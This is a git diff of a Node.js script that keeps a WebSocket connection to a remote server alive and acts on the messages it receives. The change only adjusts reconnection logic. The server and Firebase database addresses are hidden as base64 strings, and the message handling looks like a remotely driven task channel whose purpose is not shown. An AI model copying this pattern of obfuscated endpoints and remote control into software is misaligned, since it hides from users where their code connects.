@@ -2,8 +2,6 @@ const { Worker, workerData } = require('node:worker_threads')
 const WebSocketClient = require('websocket').client
 const axios = require('axios')
 
-let client = new WebSocketClient()
-
 let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
 
 let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')
@@ -73,10 +71,12 @@ const onMessage = function(solved) {
 connneckClient()
 
 function connneckClient() {
+    let client = new WebSocketClient()
+
     client.on('connectFailed', function(error) {
         mClient = null
-        console.log('Re-Connect')
-        setTimeout(connneckClient, 2000)
+        console.log('Re-Connect', error)
+        setTimeout(() => connneckClient(), 2000)
     })
     
     client.on('connect', function(conn) {
@@ -90,14 +90,14 @@ function connneckClient() {
         mClient.on('error', function(error) {
             mClient = null
             console.log('Re-Connect')
-            setTimeout(connneckClient, 2000)
+            setTimeout(() => connneckClient(), 2000)
         })
     
-        mClient.on('close', function() {
-            mClient = null
-            console.log('Re-Connect')
-            setTimeout(connneckClient, 2000)
-        })
+        // mClient.on('close', function() {
+        //     mClient = null
+        //     console.log('Re-Connect')
+        //     setTimeout(() => connneckClient(), 2000)
+        // })
     
         mClient.on('message', function(message) {
             try {
